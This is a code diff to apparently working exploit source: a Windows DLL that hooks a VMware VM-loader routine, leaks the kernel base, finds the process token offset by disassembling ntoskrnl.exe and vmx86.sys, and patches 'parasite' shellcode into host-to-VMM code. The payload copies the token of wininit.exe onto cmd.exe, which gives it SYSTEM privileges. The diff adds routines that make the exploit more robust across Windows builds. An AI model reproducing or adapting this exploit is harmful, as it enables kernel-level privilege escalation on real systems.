@@ -18,6 +18,10 @@
 extern "C" void parasite(void);
 extern "C" void parasite_end(void);
 
+ULONG rsp_hack_adj;
+ULONG parasite_adj_addr1;
+ULONG parasite_adj_addr2;
+
 hook classVM_LOADER;
 
 typedef struct _RTL_PROCESS_MODULE_INFORMATION
@@ -63,7 +67,7 @@ BOOL MGetVersion(OSVERSIONINFOEX * os)
 		func = (RtlGetVersion_FUNC)::GetProcAddress(hMod, "RtlGetVersion");
 		if (func == 0) 
 		{
-			FreeLibrary(hMod);
+			::FreeLibrary(hMod);
 			return FALSE;
 		}
 		ZeroMemory(osw, sizeof(*osw));
@@ -78,7 +82,7 @@ BOOL MGetVersion(OSVERSIONINFOEX * os)
 	else
 		return FALSE;
 
-	FreeLibrary(hMod);
+	::FreeLibrary(hMod);
 
 	return TRUE;
 }
@@ -101,12 +105,12 @@ HANDLE get_pid_by_process_name(wchar_t *proc_name)
 						return (HANDLE)(UINT_PTR)pe32.th32ProcessID;
 			} while (::Process32Next(hProcessSnap, &pe32));
 		}
-		else
-			printf("Process32First failed\r\n");
+		//else
+		//	printf("Process32First failed\r\n");
 
 	}
-	else
-		printf("CreateToolhelp32Snapshot failed\r\n");
+	//else
+	//	printf("CreateToolhelp32Snapshot failed\r\n");
 
 	return 0;
 }
@@ -273,35 +277,92 @@ void krn_pld::setup_strings(krn_pld *km_data)
 	wcscpy_s(km_data->s_DbgPrint, 64, L"DbgPrint");
 
 	
-	DWORD dwVersion = GetVersion();
-	DWORD dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
-	DWORD dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
 	km_data->token_offset = 0;
 	km_data->target_pid = 0;
 	km_data->source_pid = 0;
 
-	if (dwMajorVersion==6 && dwMinorVersion==1)
-		km_data->token_offset = 0x0208;
-	else if (dwMajorVersion == 6)
-	{
-		
-		km_data->token_offset = 0x0348;
-	}
-	else if (dwMajorVersion == 10)
-		km_data->token_offset = 0x0358;
+}
 
-	OSVERSIONINFOEX os;
-	
-	if (MGetVersion(&os))
+DWORD locate_token_offset()
+{
+	WCHAR sys_dir[MAX_PATH + 16];
+	WCHAR krnlpth[MAX_PATH + 16];
+	DWORD token_pos = 0;
+	if (::GetSystemDirectory(sys_dir, MAX_PATH))
 	{
-		
-		if (os.dwMajorVersion >= 10 && os.dwBuildNumber >= 15000)
+		wsprintf(krnlpth, L"%ws\\%ws", sys_dir, L"ntoskrnl.exe");
+		if (FileExists(krnlpth))
 		{
-			km_data->token_offset = 0x0360;
+			HMODULE hMod = ::LoadLibraryEx(krnlpth, NULL, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+			if (hMod)
+			{
+				PBYTE mod_base_addr = (PBYTE)((uintptr_t)hMod & -4);
+				PVOID va_PsReferencePrimaryToken = (PVOID)get_napi_va(mod_base_addr, 0, "PsReferencePrimaryToken");
+
+				if (va_PsReferencePrimaryToken)
+				{
+					PBYTE _PsReferencePrimaryToken = (PBYTE)mod_base_addr + (size_t)va_PsReferencePrimaryToken;
+					ULONG len = 0;
+					uhde64 hde;
+					while (len < 256)
+					{
+						len += hde.disasm(_PsReferencePrimaryToken + len);
+						if (hde.gethdes()->opcode == 0xE8)
+							break;
+						else if (hde.gethdes()->opcode == 0x8D)
+							token_pos = token_pos > hde.gethdes()->disp.disp32 ? token_pos : hde.gethdes()->disp.disp32;
+						else if (hde.gethdes()->opcode >= 0x81)
+							token_pos = token_pos > hde.gethdes()->imm.imm32 ? token_pos : hde.gethdes()->imm.imm32;
+					}
+				}
+
+				::FreeLibrary(hMod);
+			}
 		}
 	}
 
+	return token_pos;
 }
+
+
+DWORD susp_resm_threads(DWORD pid, bool resume0)
+{
+	DWORD tid = 0;
+	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	if (h != INVALID_HANDLE_VALUE)
+	{
+		THREADENTRY32 te;
+		te.dwSize = sizeof(te);
+		if (Thread32First(h, &te))
+		{
+			do
+			{
+				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID) && te.th32OwnerProcessID == pid && te.th32ThreadID != GetCurrentThreadId())
+				{
+
+
+					DWORD target_tid = te.th32ThreadID;
+					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid); 
+
+
+					if (hThread && hThread != INVALID_HANDLE_VALUE)
+					{
+						if (resume0)
+							ResumeThread(hThread);
+						else
+							SuspendThread(hThread);
+
+						CloseHandle(hThread);
+					}
+				}
+				te.dwSize = sizeof(te);
+			} while (Thread32Next(h, &te));
+		}
+		CloseHandle(h);
+	}
+	return tid;
+}
+
 
 typedef void (krn_pld::*Tpayloadfunc)(krn_pld *);
 
@@ -309,13 +370,18 @@ krn_pld payload_class;
 typedef PVOID(*Tspec_func)(void);
 Tspec_func R_hook_vm_loader;
 
+volatile unsigned long long triggered;
+
 PVOID hook_vm_loader(void)
 {
 	PVOID result = 0;
 	result = R_hook_vm_loader();
-
 	
-	BYTE Host64ToVmm_pat[] = { 0x48, 0x81, 0xc1, 0x40, 0x01, 0x00, 0x00, 0xff, 0x34, 0x24, 0x8c, 0x4c, 0x24, 0x08, 0x48, 0x89 };
+	//if (InterlockedCompareExchange(&triggered, 1, 0))
+	//	return result;
+	
+	//BYTE Host64ToVmm_pat[] = { 0x48, 0x81, 0xc1, 0x40, 0x01, 0x00, 0x00, 0xff, 0x34, 0x24, 0x8c, 0x4c, 0x24, 0x08, 0x48, 0x89 };
+	BYTE Host64ToVmm_pat[] = { 0x48, 0x81, 0xc1, 0x40, 0x01, 0x00, 0x00, 0xff, 0x34, 0x24, 0x8c, 0x4c, 0x24, 0x08 };
 	
 	PBYTE Host64ToVmm = ((PBYTE)::GetModuleHandleA(0));
 
@@ -326,7 +392,7 @@ PVOID hook_vm_loader(void)
 
 		Host64ToVmm++;
 	}
-
+	
 	WCHAR sys_dir[MAX_PATH + 16];
 	WCHAR krnlpth[MAX_PATH + 16];
 	if (::GetSystemDirectory(sys_dir, MAX_PATH))
@@ -340,17 +406,27 @@ PVOID hook_vm_loader(void)
 				PVOID _ExAllocatePool = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "ExAllocatePool");
 				PVOID _MmGetSystemRoutineAddress = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "MmGetSystemRoutineAddress");
 				PVOID _RtlInitUnicodeString = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "RtlInitUnicodeString");
-				PVOID kernel_base = leak_kernelbase();
 
-				if (*Host64ToVmm == 0x48 && kernel_base && _ExAllocatePool && _MmGetSystemRoutineAddress && _RtlInitUnicodeString)
+				PVOID kernel_base = leak_kernelbase();
+				DWORD token_offset = locate_token_offset();
+
+				if (*Host64ToVmm == 0x48 && kernel_base && _ExAllocatePool && _MmGetSystemRoutineAddress && _RtlInitUnicodeString && token_offset)
 				{
+					susp_resm_threads(GetCurrentProcessId(), 0);
+					Sleep(1000);
+
 					payload_class.setup_strings(&payload_class);
 					payload_class._RtlInitUnicodeString = (TRtlInitUnicodeString)((unsigned __int64)_RtlInitUnicodeString + (PUCHAR)kernel_base);
 					payload_class._MmGetSystemRoutineAddress = (TMmGetSystemRoutineAddress)((unsigned __int64)_MmGetSystemRoutineAddress + (PUCHAR)kernel_base);
 					payload_class.target_pid = get_pid_by_process_name(L"cmd.exe");
 					payload_class.source_pid = get_pid_by_process_name(L"wininit.exe");
+					payload_class.token_offset = token_offset;
+					
 
+		
 					memcpy(Host64ToVmm, parasite, (size_t)((PUCHAR)&parasite_end - (PUCHAR)&parasite));
+					*(PDWORD)(Host64ToVmm + parasite_adj_addr1) = rsp_hack_adj;
+					*(PDWORD)(Host64ToVmm + parasite_adj_addr2) = rsp_hack_adj;
 
 					memcpy(Host64ToVmm + 5, &kernel_base, 8);
 					memcpy(Host64ToVmm + 5 + 8, &_ExAllocatePool, 8);
@@ -366,13 +442,107 @@ PVOID hook_vm_loader(void)
 					unsigned __int64 v2 = sizeof(krn_pld);
 					memcpy((Host64ToVmm + 5) + 8 * 8, &v2, 8);
 
+					susp_resm_threads(GetCurrentProcessId(), 1);
+					
+
 				}
+				::FreeLibrary(hMod);
 			}
 		}
 	}
 
 	return result;
 }
+
+ULONG locate_return_pos()
+{
+	ULONG ret_pos = 0;
+
+	WCHAR vmx_drv_path[MAX_PATH + 2];
+	vmx_drv_path[MAX_PATH] = 0;
+	if (!GetSystemDirectory(vmx_drv_path, MAX_PATH))
+		return 0;
+
+	wcscat_s(vmx_drv_path, MAX_PATH, L"\\Drivers\\vmx86.sys");
+	if (FileExists(vmx_drv_path))
+	{
+		HANDLE fhandle = ::CreateFile(vmx_drv_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+		if (fhandle != INVALID_HANDLE_VALUE)
+		{
+			DWORD file_size = ::GetFileSize(fhandle, 0);
+
+			if (file_size != INVALID_FILE_SIZE)
+			{
+				PBYTE buffer = (PBYTE)std::malloc(file_size + 32);
+				if (buffer)
+				{
+					DWORD bytes_read = 0;
+					if (::ReadFile(fhandle, buffer, file_size, &bytes_read, NULL))
+					{
+						ULONG len = 0;
+						uhde64 hde;
+						ULONG rsp_adj = 0;
+						ULONG psh_nr = 0;
+						bool found = 0;
+						while (len < file_size)
+						{
+							len += hde.disasm(buffer + len);
+							if (hde.gethdes()->opcode == 0xCC)
+							{
+								rsp_adj = 0;
+								psh_nr = 0;
+							}
+							else if (hde.gethdes()->opcode == 0x81 && hde.gethdes()->modrm == 0xEC)
+								rsp_adj = hde.gethdes()->imm.imm32;
+							else if (hde.gethdes()->opcode >= 0x50 && hde.gethdes()->opcode <= 0x57)
+								psh_nr++;
+							else if (hde.gethdes()->opcode >= 0xB9 && hde.gethdes()->imm.imm32 == 0xC0000102)
+							{
+								found = 1;
+								ret_pos = rsp_adj + psh_nr * 8 + 8;
+								break;
+							}
+						}
+
+					}
+					std::free(buffer);
+				}
+			}
+
+			::CloseHandle(fhandle);
+		}
+	}
+
+	return ret_pos;
+}
+
+
+
+void get_return_adj_addr(PDWORD addr1, PDWORD addr2)
+{
+	ULONG len = 0;
+	ULONG lenp = 0;
+	uhde64 hde;
+	size_t para_size = (size_t)((PBYTE)&parasite_end - (PBYTE)&parasite);
+	while (len < para_size)
+	{
+		lenp = len;
+		len += hde.disasm((PBYTE)parasite + len);
+		if (hde.gethdes()->opcode == 0xFF && hde.gethdes()->modrm == 0xB4 && hde.gethdes()->sib == 0x24)
+		{
+			*addr1 = (lenp + 3);
+		}
+		else if (hde.gethdes()->opcode == 0x89 && hde.gethdes()->modrm == 0x84 && hde.gethdes()->sib == 0x24)
+		{
+			*addr2 = (lenp + 4);
+			break;
+		}
+	}
+	return;
+}
+
+
 
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -382,24 +552,53 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 {
 	HMODULE hmod;
 	PBYTE vm_loader_func;
-	const BYTE vmloader_pat[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x45, 0x33 };
+	const BYTE vmloader_pat[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC };
 
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
 
 		::GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN, (LPCTSTR)hModule, &hmod);
-		vm_loader_func = (PBYTE)::GetModuleHandleA(0);
 
-		while (true) // don't care, just crash if pattern not found
+		rsp_hack_adj = locate_return_pos();
+		get_return_adj_addr(&parasite_adj_addr1, &parasite_adj_addr2);
+
+		if (parasite_adj_addr1 && parasite_adj_addr2 && rsp_hack_adj)
 		{
-			if (!memcmp(vm_loader_func, vmloader_pat, sizeof(vmloader_pat)))
-				break;
-			vm_loader_func++;
+			vm_loader_func = (PBYTE)::GetModuleHandleA(0);
+
+			while (true) // don't care, just crash if pattern not found
+			{
+				if (!memcmp(vm_loader_func, vmloader_pat, sizeof(vmloader_pat)))
+				{
+					ULONG len = 0;
+					ULONG lenp = 0;
+					uhde64 hde;
+					bool found = 0;
+					while (len < 200)
+					{
+						lenp = len;
+						len += hde.disasm(vm_loader_func + len);
+						if (hde.gethdes()->opcode == 0xFF && hde.gethdes()->modrm >= 0xD0 && hde.gethdes()->modrm <= 0xD7)
+						{
+							found = 1;
+							break;
+						}
+						else if (hde.gethdes()->opcode == 0xC3 || hde.gethdes()->opcode == 0xE8 || hde.gethdes()->opcode == 0xE9)
+							break;
+						
+					}
+					if (found)
+						break;
+				}
+
+				vm_loader_func++;
+			}
+
+
+			classVM_LOADER.sethook(vm_loader_func, hook_vm_loader, (PVOID *)&R_hook_vm_loader);
 		}
-
-
-		classVM_LOADER.sethook(vm_loader_func, hook_vm_loader, (PVOID *)&R_hook_vm_loader);
+	
 
 		break;
 	case DLL_THREAD_ATTACH:
@@ -409,4 +608,3 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	}
 	return TRUE;
 }
-
